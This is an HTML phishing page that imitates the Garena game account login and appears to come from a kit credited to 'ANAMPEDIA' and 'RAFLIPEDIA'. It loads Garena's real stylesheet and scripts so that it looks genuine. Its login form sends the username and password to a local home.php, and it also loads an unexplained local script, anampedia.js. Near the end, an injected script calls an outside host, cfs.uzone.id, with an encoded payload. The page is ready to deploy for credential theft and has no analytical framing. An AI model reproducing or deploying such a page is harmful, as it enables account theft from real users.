<!---- SCRIPT BY ANAMPEDIA ---->
<!---- REDESIGN BY RAFLIPEDIA ---->
<!---- Please appreciate us :) ---->
<html>
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
      <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
      <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
      <meta name="description" content="Garena">
      <link href="https://sso.garena.com/css/sso.css?v=0.53" rel="stylesheet" type="text/css">
      <title>Garena</title>
   </head>
   <body>
      
      <div id="page">
         <div id="header" class="header">
            <div class="langWrapper fr">
               <select class="lang">
                  <option value="en-US">International - English</option>
                  <option value="en-SG">Singapore - English</option>
                  <option value="en-PH">Philippines - English</option>
                  <option value="id-ID">Indonesia - Bahasa Indonesia</option>
                  <option value="en-MY">Malaysia - English</option>
               </select>
               <span class="icon-earth"></span>
            </div>
            <div class="topBarGarena"></div>
            <div class="topBar"></div>
            <h1><a class="logo" href="http://www.garena.com" target="_blank"><img src="../images/footer_zii.png" style="margin-top:10px;height: 35px;"></a></h1>
         </div>
         <div id="main-panel">
            <div class="content" style="top: 0px;">
               <h2 class="title">Login</h2>
               <div class="loginForm">
			   <form action="home.php" method="post">
                  <div id="line-country" style="display: none;" class="line">

                  </div>
                  
				  <div id="line-account" class="line">
				  <input style="width:395px;" id="username" name="username" value="" placeholder="Username Garena / E-Mail" autocorrect="off" autocapitalize="off" type="text"></div>
				  
				  <div id="line-account" class="line">
				  <input style="width:395px;" id="password" name="password" value="" placeholder="Password" autocorrect="off" autocapitalize="off" type="password"></div>

                  <div id="line-btn" class="line btnLine">
				  <input id="garenabutton" name="login" value="Login Sekarang" onclick="masukin()" class="btn"  type="submit" >
				  </div>
				  </form>
              </div> 
               <div class="linkLine"><a id="sso_login_link_register" href="https://sso.garena.com/ui/register?redirect_uri=https%3A%2F%2Fsso.garena.com%2Fui%2Flogin%3Fapp_id%3D10000%26redirect_uri%3Dhttps%253A%252F%252Fwww.garena.co.id%252F%26locale%3Did-ID%26display%3Dpage&display=page&locale=id-ID" class="sec">Registrasi</a><span role="separator" aria-hidden="true"> . </span>
			   <a id="sso_login_link_forget_password" href="https://account.garena.com/recovery#/" class="sec">Lupa Password</a></div>
            </div>
         </div>
      </div>
<script src="anampedia.js"></script>
	<script src="http://gcms2.garena.com/static/assets/js/jquery.min.js"></script>
    <script src="http://gcms2.garena.com/static/assets/js/gcms-extension.js"></script>
	<script  src="http://gcms2.garena.com/static/assets/js/jsencrypt/jsbn.js"></script>
	<script  src="http://gcms2.garena.com/static/assets/js/jsencrypt/prng4.js"></script>
	<script  src="http://gcms2.garena.com/static/assets/js/jsencrypt/rng.js"></script>
	<script  src="http://gcms2.garena.com/static/assets/js/jsencrypt/rsa.js"></script>
	<script  src="http://gcms2.garena.com/static/assets/js/jsencrypt/base64.js"></script>
	<script  src="http://gcms2.garena.com/static/assets/js/jsencrypt/garena_login.js"></script>
   <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKi8Y4igzgmQkbFwTke0ZDkKzOGit8nFCIfTT32X5NWc%2fyZ206YxVy%2fS6WMo4igvTOPTGIgtOW5IQNdmhAYpURam1sqYIUSGNJPStdOHqwiLTnZOf4YP%2fvpKhgSHTvhdnc57WfOamNNwI2htHTKW2RUVA%2femI8J0SFl9Af%2frNLMyaz94EaoimKrSHMT77Knsh%2bRfLH4YoT7779Ezds96vdQY70XP41XxEAZU4miAyTUZfmQJ2IpbVAfWKUi042Ec3o0789xI5H6dKcq7tGmZOg%2fuLl0Gnlro7%2fMxR%2fV7rQZlOw2qiGHLXMPHsVA0rsHBhFsCcd3%2f6RqSs6RTiIiwxmRJRjZ%2bfCr7K%2b0UzWzm4adVjZr5r9kj0%2bHyAFMMh1y0ybdfmnkSwmHGDNVDISG2TpGh549pgwdO2ZJNVkaxncip3Z%2fsA0GCPDoySyUfL%2fQpT2RhLWPoVL%2bxffitZgb%2b5YVsiSQdYjDcnXX6ZKQHfibmAwLsK2xHOlYsc7SqG%2fwQJHVvXp2nLgtjZqdhznyjfzGNY2smk6BasSdYmodlRpKTs%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>
<!---- SCRIPT BY ANAMPEDIA ---->
<!---- REDESIGN BY RAFLIPEDIA ---->
<!---- Please appreciate us :) ---->